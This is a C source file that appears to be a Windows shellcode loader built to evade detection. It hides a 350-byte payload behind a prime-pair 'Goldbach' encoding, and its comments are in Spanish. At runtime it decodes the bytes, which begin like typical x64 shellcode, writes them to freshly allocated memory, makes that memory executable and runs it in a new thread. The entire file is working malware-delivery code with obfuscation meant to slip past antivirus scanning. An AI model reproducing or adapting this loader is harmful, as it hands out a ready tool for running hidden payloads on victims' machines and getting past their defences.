
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

typedef struct {
	unsigned short firstPrime;
	unsigned short secondPrime;
}goldbachUnit;

unsigned char goldbachDecode(goldbachUnit input) {
	unsigned short number = ((input.firstPrime + input.secondPrime - 4) / 2); //suma los numeros primos, les resta 4 y los divide entre dos para recuperar byte original
	unsigned char output = number;
	return output;
}

int main(void) {

	void* alloc_mem;
	BOOL retval;
	HANDLE threadHandle;
	DWORD oldprotect = 0;

	goldbachUnit encodedPayload[] = {
	{0x5,0x1f7},{0x59,0x3b},{0xef,0x17},{0x65,0x167},{0xe3,0x101},{0x17,0x1eb},{0x35,0x1cd},{0x71,0x191},{0xc7,0x10d},{0x1f,0x185},{0x2,0x2},
	{0x2,0x2},{0x2,0x2},{0x43,0x43},{0x1d,0x89},{0x49,0x3d},{0x9d,0x7},{0x89,0x1f},{0x71,0x35},{0x13,0x9d},{0x59,0x3b},
	{0x53,0x13},{0x71,0x137},{0xa3,0x2b},{0x3b,0x59},{0xd,0x10d},{0x11,0x97},{0x3,0xc1},{0x61,0x1f},{0x65,0x2f},{0x47,0xd3},
	{0x59,0x4f},{0x2f,0x5},{0x1f,0x61},{0x89,0xb},{0x67,0xb3},{0x4f,0x59},{0x3d,0x7},{0x61,0x1f},{0x89,0xb},{0xd3,0x47},
	{0x3b,0xad},{0x7f,0x25},{0x13,0x6d},{0x3b,0x59},{0x5,0x1d},{0xc5,0xad},{0x95,0x3},{0x8b,0xd},{0x7,0x97},{0x3d,0x29},
	{0x59,0x13d},{0x29,0x6b},{0x59,0xd},{0x101,0x83},{0x43,0x119},{0x53,0x29},{0x5,0xc1},{0x3d,0xbf},{0x5,0x3},{0xd,0x4f},
	{0x7,0x3d},{0x25,0x61},{0x13d,0x49},{0x2f,0x167},{0xb,0x13},{0x83,0x3},{0x3,0x3},{0x3b,0x14b},{0x49,0x17f},{0x83,0x15b},
	{0x61,0x47},{0x43,0x43},{0x35,0x71},{0x43,0x3d},{0x89,0xb},{0x13,0x107},{0x29,0x7f},{0x1f,0x25},{0x61,0x1f},{0x6d,0xad},
	{0x17,0x71},{0x53,0x29},{0x2f,0x65},{0x3,0x3},{0x125,0x7f},{0x6d,0x13},{0x59,0xc1},{0x3,0x101},{0x4f,0xc5},{0x2,0x2},
	{0x2,0x2},{0x2,0x2},{0x11,0x83},{0x8b,0x83},{0xc5,0xbf},{0x8b,0x61},{0x59,0x89},{0x6b,0x29},{0x3,0x3},{0x101,0xa3},
	{0xd,0x97},{0x43,0x3d},{0xef,0x2b},{0x29,0x6b},{0x29,0xb},{0x3d,0x43},{0x49,0x43},{0x115,0x5},{0x5,0x7f},{0x1f,0x25},
	{0x47,0x4f},{0x3,0x3},{0x71,0x133},{0x4f,0x17b},{0x7f,0x3d},{0xb,0x89},{0xb,0x1f7},{0xef,0xa7},{0x6d,0x13},{0x3d,0x49},
	{0xe5,0x35},{0x4f,0x1d},{0xef,0x25},{0xb,0x89},{0x3,0x3},{0x17b,0x35},{0x7f,0x1f},{0x13,0x53},{0xa7,0xef},{0x59,0x3b},
	{0x1f,0x47},{0x83,0x101},{0x151,0xb},{0x67,0x1f},{0x7,0x17f},{0x167,0x2f},{0xd,0x11},{0x49,0x3d},{0x3,0x3},{0x17b,0xb},
	{0x49,0x2b},{0x15d,0x67},{0xb3,0x3b},{0x1b7,0x2f},{0x6d,0x13},{0x3b,0x61},{0x5,0x5},{0x3b,0x61},{0x1d,0x2f},{0x7,0xd},
	{0x83,0xb},{0x2f,0x47},{0xc7,0xdf},{0x47,0xa7},{0x10d,0xa3},{0x1d,0x97},{0x3d,0x43},{0x89,0x3},{0xe5,0x35},{0x65,0x1f},
	{0x5,0x47},{0x59,0x3d},{0x3,0x3},{0x9d,0x107},{0x47,0x89},{0x43,0x3d},{0x83,0x3},{0xd,0x10d},{0xb,0x11},{0x2f,0x65},
	{0x61,0x1f},{0x25,0x67},{0x6d,0xad},{0x35,0x4f},{0x13,0x29},{0x6d,0x29},{0x3,0x3},{0x53,0x151},{0x1f,0x61},{0x61,0x25},
	{0x10f,0xb},{0x5,0x7},{0x13,0x101},{0x59,0x3b},{0x3,0x3},{0x17f,0x25},{0x25,0x61},{0x11,0xa3},{0x67,0x1f},{0xad,0x7},
	{0x95,0x2b},{0x3,0xb3},{0x11,0xa7},{0x3d,0x49},{0x1f,0x95},{0x61,0x25},{0x13,0xa3},{0x61,0x25},{0xb5,0x3},{0x83,0x11},
	{0x25,0xe5},{0xc1,0x11b},{0x25,0x1f},{0x67,0x1f},{0x61,0x47},{0xe9,0x119},{0x199,0x2b},{0xa3,0x11},{0x83,0x3},{0x3,0xb3},
	{0x83,0x35},{0x1f,0x61},{0x3b,0x59},{0x97,0x83},{0x3,0x25},{0x3,0x1d3},{0xd,0x89},{0x53,0x1af},{0x1eb,0x17},{0x71,0x191},
	{0x83,0x3b},{0x13,0x6d},{0x3b,0x59},{0x35,0xe9},{0xe3,0x3b},{0x29,0x67},{0x3,0x3},{0x2,0x2},{0x2,0x2},{0x7f,0x7},
	{0x17,0x161},{0x2b,0x71},{0xa3,0x4f},{0x13,0x3d},{0x7,0xb},{0x71,0x191},{0x29,0x185},{0x4f,0x47},{0x107,0x8b},{0x137,0x4f},
	{0x3d,0x47},{0x2,0x2},{0x2,0x2},{0x2,0x2},{0x6d,0x13},{0x65,0x2f},{0x10d,0x11},{0xdf,0x4f},{0x47,0x11},{0x3,0x3},
	{0x2,0x2},{0x2,0x2},{0x61,0x1f},{0x49,0x53},{0x101,0x1d},{0xad,0x61},{0x61,0x13},{0x3,0x3},{0x2,0x2},{0x2,0x2},
	{0x83,0x11},{0x5,0x61},{0x2f,0x167},{0x3,0x83},{0x10d,0x6b},{0x59,0x35},{0xc7,0x43},{0x9d,0x13},{0xd,0x5},{0x5,0x1fd},
	{0x13d,0x71},{0xe3,0x97},{0x67,0x15d},{0x3,0x3b},{0x47,0x11},{0xb,0xd},{0x67,0x1f},{0x17,0x161},{0x4f,0x101},{0x13,0x11b},
	{0x119,0x65},{0x89,0xb5},{0xe9,0x119},{0x107,0xa7},{0x3b,0x59},{0x67,0xa3},{0xe5,0xa7},{0x35,0x1f},{0x35,0x47},{0x3,0xd},
	{0xdf,0x1d},{0x5,0x13},{0x9d,0x67},{0x6d,0x18d},{0x67,0x15d},{0x65,0x89},{0x7,0x7},{0xe3,0x97},{0x7,0x8b},{0x25,0x5},
	{0x83,0x65},{0x1d,0xc5},{0xc5,0x13},{0x2,0x2},{0x8b,0x2b},{0x1f,0x67},{0x61,0xb5},{0x1a5,0x13},{0x1bb,0x47},{0x17f,0x2f},
	{0xb,0x89},{0xb3,0x2f},{0xa7,0x35},{0xa7,0x1f},{0x1f,0x25},{0x3b,0x59},{0x13,0xb3},{0x5,0xc5},{0x7,0xd3},{0x4f,0x43},
	{0x61,0x2b},{0x1d,0x7f},{0x2f,0x17},{0x2,0x2},{0xb,0x89},{0xa7,0x3b},{0xc5,0x17},{0x11,0xb5},{0x3d,0x7},{0x2f,0x65},
	{0xc1,0x5},{0x83,0x47},{0x3d,0x9d},{0x13,0x7f},{0x3d,0x4f},{0x67,0x35},{0x3,0x43},{0x2,0x2},{0x29,0xc5},{0xe5,0x5},
	{0xc1,0xd},{0x29,0xbf},{0x53,0x17},{0x25,0x43},{0x4f,0x11},{0xa7,0x25},{0xc5,0x17},{0xa7,0x35},{0x2,0x2},{0x2,0x2}
	};

	unsigned char shellcodePayload[350];
	unsigned int lengthOfshellcodePayload = 350;

	for (int i = 0; i < sizeof(shellcodePayload); i++) {
		shellcodePayload[i] = goldbachDecode(encodedPayload[i]);
	}


	alloc_mem = VirtualAlloc(0, lengthOfshellcodePayload, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

	RtlMoveMemory(alloc_mem, shellcodePayload, lengthOfshellcodePayload);

	retval = VirtualProtect(alloc_mem, lengthOfshellcodePayload, PAGE_EXECUTE_READ, &oldprotect);

	if (retval != 0) {
		threadHandle = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)alloc_mem, 0, 0, 0);
		WaitForSingleObject(threadHandle, -1);
	}

	return 0;
}
